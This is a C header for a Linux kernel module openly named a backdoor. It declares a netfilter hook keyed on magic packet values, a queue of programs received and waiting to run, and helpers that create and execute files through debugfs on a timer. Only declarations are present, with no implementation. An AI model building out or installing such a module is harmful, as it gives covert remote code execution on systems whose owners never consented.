#ifndef BACKDOOR_H
#define BACKDOOR_H

/* Generic */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kthread.h>

MODULE_AUTHOR("Nick Bulischeck");
MODULE_LICENSE("GPL");

#define DATA_LEN 255
#define TARGET_SPI 0x48dcd78c
#define TARGET_SEQ 0xae574ada
#define READY 0
#define FINISHED 1

struct nf_hook_ops;

typedef struct program_list {
	/* 0 = ready, 1 = finished */
	short int state;

	/* Program to be run */
	void *buffer;

	/* Length of program */
	unsigned int length;

	/* List entry */
	struct list_head prog_list;
} program_list;

/* Netfilter hook */
int nfhook_init(void);
void nfhook_exit(void);

/* debugfs helpers */
int create_file(void);
void execute_file(void);
void destroy_file(void);
void execute_ready_programs(struct timer_list *tl);

/* state helpers */
void create_timer(unsigned long timeout); // Timeout in seconds
void destroy_timer(void);

#endif /* BACKDOOR_H */
